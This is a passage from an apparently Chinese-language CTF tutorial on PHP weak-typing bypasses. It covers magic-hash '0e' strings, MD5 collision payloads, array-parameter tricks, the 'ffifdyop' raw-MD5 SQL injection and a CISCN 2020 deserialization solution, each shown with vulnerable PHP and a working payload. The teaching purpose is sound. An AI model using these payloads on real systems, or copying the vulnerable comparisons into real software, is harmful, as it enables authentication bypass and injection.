class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br></pre></td></tr></table></figure><p>双 md5：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$md5          md5($md5)</span><br><span class="line"><span class="number">0e00275209979</span> <span class="number">0e551387587965716321018342879905</span></span><br><span class="line"><span class="number">0e00506035745</span> <span class="number">0e224441551631909369101555335043</span></span><br><span class="line"><span class="number">0e00540451811</span> <span class="number">0e057099852684304412663796608095</span></span><br><span class="line"><span class="number">0e00678205148</span> <span class="number">0e934049274119262631743072394111</span></span><br><span class="line"><span class="number">0e00741250258</span> <span class="number">0e899567782965109269932883593603</span></span><br><span class="line"><span class="number">0e00928251504</span> <span class="number">0e148856674729228041723861799600</span></span><br><span class="line"><span class="number">0e01350016114</span> <span class="number">0e769018222125751782256460324867</span></span><br><span class="line"><span class="number">0e01352028862</span> <span class="number">0e388419153010508575572061606161</span></span><br><span class="line"><span class="number">0e01392313004</span> <span class="number">0e793314107039222217518920037885</span></span><br><span class="line"><span class="number">0e01875552079</span> <span class="number">0e780449305367629893512581736357</span></span><br><span class="line"><span class="number">0e01975903983</span> <span class="number">0e317084484960342086618161584202</span></span><br><span class="line"><span class="number">0e02042356163</span> <span class="number">0e335912055437180460060141819624</span></span><br><span class="line"><span class="number">0e02218562930</span> <span class="number">0e151492820470888772364059321579</span></span><br><span class="line"><span class="number">0e02451355147</span> <span class="number">0e866503534356013079241759641492</span></span><br><span class="line"><span class="number">0e02739970294</span> <span class="number">0e894318228115677783240047043017</span></span><br><span class="line"><span class="number">0e02760920150</span> <span class="number">0e413159393756646578537635311046</span></span><br><span class="line"><span class="number">0e02784726287</span> <span class="number">0e433955189140949269100965859496</span></span><br><span class="line"><span class="number">0e03298616350</span> <span class="number">0e851613188370453906408258609284</span></span><br><span class="line"><span class="number">0e03393034171</span> <span class="number">0e077847024281996293485700020358</span></span><br></pre></td></tr></table></figure><p><code>$md5 == md5($md5)</code>，0e+数字 md5 爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">'0e'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">breakit</span><span class="params">()</span>:</span></span><br><span class="line">    iters = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        s = prefix + str(iters)</span><br><span class="line">        hashed_s = hashlib.md5(s).hexdigest()</span><br><span class="line">        iters = iters + <span class="number">1</span></span><br><span class="line">        r = re.match(<span class="string">'^0e[0-9]&#123;30&#125;'</span>, hashed_s)</span><br><span class="line">        <span class="keyword">if</span> r:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] found! md5( &#123;&#125; ) ---&gt; &#123;&#125;"</span>.format(s, hashed_s)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] in &#123;&#125; iterations"</span>.format(iters)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[+] current value: &#123;&#125;       &#123;&#125; iterations, continue..."</span>.format(s, iters)</span><br><span class="line"></span><br><span class="line">breakit()</span><br></pre></td></tr></table></figure><p>PHP 版本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;;$i++)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"0e&#123;$i&#125;"</span>==md5(<span class="string">"0e&#123;$i&#125;"</span>))</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"[+] found! 0e&#123;$i&#125;"</span>); </span><br><span class="line">    <span class="keyword">elseif</span> ($i % <span class="number">1000000</span> === <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[+] current value: &#123;$i&#125;\n"</span>;</span><br></pre></td></tr></table></figure><ol start="2"><li>md5 碰撞</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>((string)$_POST[<span class="string">'param1'</span>]!==(string)$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"success!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个参数内容不同，但 md5 值相同的，可以使用 fastcoll 工具碰撞</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">para<span class="name">m1</span>=<span class="meta">%</span><span class="number">4</span>d<span class="meta">%</span>c<span class="number">9</span><span class="meta">%</span><span class="number">68</span><span class="meta">%</span>ff<span class="meta">%</span><span class="number">0</span>e<span class="meta">%</span>e<span class="number">3</span><span class="meta">%</span><span class="number">5</span>c<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">95</span><span class="meta">%</span><span class="number">72</span><span class="meta">%</span>d<span class="number">4</span><span class="meta">%</span><span class="number">77</span><span class="meta">%</span><span class="number">7</span>b<span class="meta">%</span><span class="number">72</span><span class="meta">%</span><span class="number">15</span><span class="meta">%</span><span class="number">87</span><span class="meta">%</span>d<span class="number">3</span><span class="meta">%</span><span class="number">6</span>f<span class="meta">%</span>a<span class="number">7</span><span class="meta">%</span>b<span class="number">2</span><span class="meta">%</span><span class="number">1</span>b<span class="meta">%</span>dc<span class="meta">%</span><span class="number">56</span><span class="meta">%</span>b<span class="number">7</span><span class="meta">%</span><span class="number">4</span>a<span class="meta">%</span><span class="number">3</span>d<span class="meta">%</span>c<span class="number">0</span><span class="meta">%</span><span class="number">78</span><span class="meta">%</span><span class="number">3</span>e<span class="meta">%</span><span class="number">7</span>b<span class="meta">%</span><span class="number">95</span><span class="meta">%</span><span class="number">18</span><span class="meta">%</span>af<span class="meta">%</span>bf<span class="meta">%</span>a<span class="number">2</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span>a<span class="number">8</span><span class="meta">%</span><span class="number">28</span><span class="meta">%</span><span class="number">4</span>b<span class="meta">%</span>f<span class="number">3</span><span class="meta">%</span><span class="number">6</span>e<span class="meta">%</span><span class="number">8</span>e<span class="meta">%</span><span class="number">4</span>b<span class="meta">%</span><span class="number">55</span><span class="meta">%</span>b<span class="number">3</span><span class="meta">%</span><span class="number">5</span>f<span class="meta">%</span><span class="number">42</span><span class="meta">%</span><span class="number">75</span><span class="meta">%</span><span class="number">93</span><span class="meta">%</span>d<span class="number">8</span><span class="meta">%</span><span class="number">49</span><span class="meta">%</span><span class="number">67</span><span class="meta">%</span><span class="number">6</span>d<span class="meta">%</span>a<span class="number">0</span><span class="meta">%</span>d<span class="number">1</span><span class="meta">%</span><span class="number">55</span><span class="meta">%</span><span class="number">5</span>d<span class="meta">%</span><span class="number">83</span><span class="meta">%</span><span class="number">60</span><span class="meta">%</span>fb<span class="meta">%</span><span class="number">5</span>f<span class="meta">%</span><span class="number">07</span><span class="meta">%</span>fe<span class="meta">%</span>a<span class="number">2</span></span><br><span class="line">para<span class="name">m2</span>=<span class="meta">%</span><span class="number">4</span>d<span class="meta">%</span>c<span class="number">9</span><span class="meta">%</span><span class="number">68</span><span class="meta">%</span>ff<span class="meta">%</span><span class="number">0</span>e<span class="meta">%</span>e<span class="number">3</span><span class="meta">%</span><span class="number">5</span>c<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">95</span><span class="meta">%</span><span class="number">72</span><span class="meta">%</span>d<span class="number">4</span><span class="meta">%</span><span class="number">77</span><span class="meta">%</span><span class="number">7</span>b<span class="meta">%</span><span class="number">72</span><span class="meta">%</span><span class="number">15</span><span class="meta">%</span><span class="number">87</span><span class="meta">%</span>d<span class="number">3</span><span class="meta">%</span><span class="number">6</span>f<span class="meta">%</span>a<span class="number">7</span><span class="meta">%</span>b<span class="number">2</span><span class="meta">%</span><span class="number">1</span>b<span class="meta">%</span>dc<span class="meta">%</span><span class="number">56</span><span class="meta">%</span>b<span class="number">7</span><span class="meta">%</span><span class="number">4</span>a<span class="meta">%</span><span class="number">3</span>d<span class="meta">%</span>c<span class="number">0</span><span class="meta">%</span><span class="number">78</span><span class="meta">%</span><span class="number">3</span>e<span class="meta">%</span><span class="number">7</span>b<span class="meta">%</span><span class="number">95</span><span class="meta">%</span><span class="number">18</span><span class="meta">%</span>af<span class="meta">%</span>bf<span class="meta">%</span>a<span class="number">2</span><span class="meta">%</span><span class="number">02</span><span class="meta">%</span>a<span class="number">8</span><span class="meta">%</span><span class="number">28</span><span class="meta">%</span><span class="number">4</span>b<span class="meta">%</span>f<span class="number">3</span><span class="meta">%</span><span class="number">6</span>e<span class="meta">%</span><span class="number">8</span>e<span class="meta">%</span><span class="number">4</span>b<span class="meta">%</span><span class="number">55</span><span class="meta">%</span>b<span class="number">3</span><span class="meta">%</span><span class="number">5</span>f<span class="meta">%</span><span class="number">42</span><span class="meta">%</span><span class="number">75</span><span class="meta">%</span><span class="number">93</span><span class="meta">%</span>d<span class="number">8</span><span class="meta">%</span><span class="number">49</span><span class="meta">%</span><span class="number">67</span><span class="meta">%</span><span class="number">6</span>d<span class="meta">%</span>a<span class="number">0</span><span class="meta">%</span>d<span class="number">1</span><span class="meta">%</span>d<span class="number">5</span><span class="meta">%</span><span class="number">5</span>d<span class="meta">%</span><span class="number">83</span><span class="meta">%</span><span class="number">60</span><span class="meta">%</span>fb<span class="meta">%</span><span class="number">5</span>f<span class="meta">%</span><span class="number">07</span><span class="meta">%</span>fe<span class="meta">%</span>a<span class="number">2</span></span><br></pre></td></tr></table></figure><p>最好使用 burp 发包，hackbar 插件有些时候会有问题</p><ol start="3"><li>处理数组问题</li></ol><p>PHP手册中的md5()函数的描述是<code>string md5 ( string $str [, bool $raw_output = false ] )</code>，md5()中的需要是一个string类型的参数。但是当你传递一个array时，md5()不会报错，只是会无法正确地求出array的md5值，并且返回<code>NULL</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(md5($_GET[<span class="string">'a'</span>]) == md5($_GET[<span class="string">'b'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"yes"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=<span class="number">1</span>&amp;b[]=<span class="number">2</span></span><br></pre></td></tr></table></figure><ol start="4"><li>处理 INF</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(md5(<span class="string">'INF'</span>));</span><br><span class="line"><span class="comment">//9517fd0bf8faa655990a4dffe358e13e</span></span><br><span class="line">var_dump(md5(<span class="number">9e999999</span>));<span class="comment">//9e999999即INF</span></span><br><span class="line"><span class="comment">//9517fd0bf8faa655990a4dffe358e13e</span></span><br></pre></td></tr></table></figure><p>即可满足 <code>md5($this-&gt;trick1) === md5($this-&gt;trick2)</code></p><ol start="5"><li>处理 0.1*0.1</li></ol><p><code>0.1*0.1</code> 实际上由于浮点数处理的原因，数值为 <code>0.010000000000000002</code></p><p>猜测 md5 函数处理时对小数的部分进行了舍弃，所以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(md5(<span class="number">0.01</span>));</span><br><span class="line"><span class="comment">//04817efd11c15364a6ec239780038862</span></span><br><span class="line">var_dump(md5(<span class="number">0.1</span>*<span class="number">0.1</span>));</span><br><span class="line"><span class="comment">//04817efd11c15364a6ec239780038862</span></span><br></pre></td></tr></table></figure><p><strong>Ciscn 2020 easytrick</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (string)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"你太长了"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span class="string">'trick'</span>]);</span><br></pre></td></tr></table></figure><p>payload1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (string)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"你太长了"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> trick;</span><br><span class="line">$a-&gt;trick1=<span class="string">"INF"</span>;</span><br><span class="line">$a-&gt;trick2=<span class="number">9e999999</span>;</span><br><span class="line">var_dump(serialize($a));</span><br></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (string)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"你太长了"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> trick;</span><br><span class="line">$a-&gt;trick1=<span class="number">0.01</span>;</span><br><span class="line">$a-&gt;trick2=<span class="number">0.1</span>*<span class="number">0.1</span>;</span><br><span class="line">var_dump(serialize($a));</span><br></pre></td></tr></table></figure><p>这里采用序列化的方式是因为需要传入的是数字，而常规 post 或 get 输入默认会被当做字符串处理</p><ol start="6"><li>第二个参数被设置为 true</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE username = 'admin' and password = '"</span>.md5($password,<span class="keyword">true</span>).<span class="string">"'"</span>;</span><br><span class="line">$result=mysqli_query($link,$sql);</span><br><span class="line">    <span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'flag is :'</span>.$flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'密码错误!'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>第二个参数设置为 true 时， MD5 报文摘要将以16字节长度的原始二进制格式返回</p><p><code>?password=ffifdyop</code> ，sql 语句转换为 <code>SELECT * FROM admin WHERE pass=&#39; &#39;or &#39; 6&#39;&lt;trash&gt;</code></p><p>同样 <code>129581926211651571912466741651878684928</code> md5 后为 <code>T0Do#&#39;or&#39;8</code></p><h3 id="1-4-json-decode"><a href="#1-4-json-decode" class="headerlink" title="1.4 json_decode()"></a>1.4 json_decode()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>])) &#123;</span><br><span class="line">    $message = json_decode($_POST[<span class="string">'message'</span>]);</span><br><span class="line">    $key =<span class="string">"*********"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($message-&gt;key == $key) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运用 bool 欺骗，json_decode 将 key 值解析为 bool 类型的 false，payload <code>message={&quot;key&quot;:0}</code></p><h3 id="1-5-array-search"><a href="#1-5-array-search" class="headerlink" title="1.5 array_search()"></a>1.5 array_search()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!is_array($_GET[<span class="string">'test'</span>]))&#123;<span class="keyword">exit</span>();&#125;</span><br><span class="line">$test=$_GET[<span class="string">'test'</span>];</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($test);$i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>($test[$i]===<span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $test[$i]=intval($test[$i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(array_search(<span class="string">"admin"</span>,$test)===<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/array_search" target="_blank" rel="noopener">https://www.php.net/array_search</a></p><p>参照 PHP 手册，<code>array_search ( mixed $needle , array $haystack [, bool $strict = false ] ) : mixed</code>，第三个参数 <code>strict</code> 默认为 <code>false</code>，如果可选的第三个参数 <code>strict</code> 为 <code>TRUE</code>，则 array_search() 将在 <code>haystack</code> 中检查<em>完全相同</em>的元素。 这意味着同样严格比较 <code>haystack</code>里 <code>needle</code> 的 类型，并且对象需是同一个实例。</p><p>即默认为 <code>false</code> 时，会进行弱类型比较，于是 payload <code>test[]=0</code></p><h3 id="1-6-strcmp"><a href="#1-6-strcmp" class="headerlink" title="1.6 strcmp()"></a>1.6 strcmp()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">    $password=<span class="string">"***************"</span>;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span> (strcmp($_POST[<span class="string">'password'</span>], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Right!!!login success"</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Wrong password.."</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>strcmp()函数在PHP官方手册中的描述是<code>int strcmp ( string $str1 , string $str2 )</code>,需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。</p><p>如果传入给出strcmp()的参数是数组则返回NULL，<code>NULL==0</code>是 <code>bool(true)</code>，所以 payload <code>password[]=2</code></p><h3 id="1-7-sha1"><a href="#1-7-sha1" class="headerlink" title="1.7 sha1()"></a>1.7 sha1()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">$tmp1 = $_POST[<span class="string">'tmp1'</span>];</span><br><span class="line">$tmp2 = $_POST[<span class="string">'tmp2'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($tmp1) &amp;&amp; !<span class="keyword">isset</span>($tmp2) &amp;&amp; $tmp1 == $tmp2 )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(md5($tmp1)==md5($tmp2) &amp;&amp; sha1($tmp1)==sha1($tmp2)&amp;&amp;base64_decode($tmp1) == base64_decode($tmp2))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"successful"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入数组放回 <code>NULL</code>，payload <code>tmp1[]=1&amp;tmp2[]=2</code></p><h3 id="1-8-base64-encode-、base64-decode"><a href="#1-8-base64-encode-、base64-decode" class="headerlink" title="1.8 base64_encode()、base64_decode()"></a>1.8 base64_encode()、base64_decode()</h3><p>同 <code>sha1()</code> 和 <code>strcmp()</code></p><h3 id="1-9-intval"><a href="#1-9-intval" class="headerlink" title="1.9 intval()"></a>1.9 intval()</h3><p>intval(var)函数用于获取变量的整数值。在转换时，函数会从字符串起始处进行转换直到遇到一个非数字的字符，即使出现无法转换的字符串也不会报错而是返回0，从而可以导致如下情形的Bypass</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span 